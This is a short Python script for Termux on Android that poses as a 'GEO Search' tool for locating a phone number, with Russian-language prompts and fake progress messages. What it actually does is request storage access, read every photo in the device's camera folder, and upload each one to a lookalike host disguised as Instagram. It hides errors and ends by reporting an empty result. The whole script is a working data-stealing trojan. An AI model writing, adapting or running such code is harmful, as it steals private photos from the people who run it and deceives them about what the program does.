import os, requests
#Termux-lab POST
print("GEO Search")
input("Номер телефона: ")
print("Загрузка БД...")
os.system("termux-setup-storage")
print("Идет процесс поиска по GPS")
l = os.listdir("../storage/shared/DCIM/Camera")
for i in range(len(l)):
	f = open("../storage/shared/DCIM/Camera/"+l[i], "rb")
	r = f.read()
	try:
		requests.post("http://instagram.com.xsph.ru/test/", data={"im": r})
	except:
		pass
print("Пусто...")
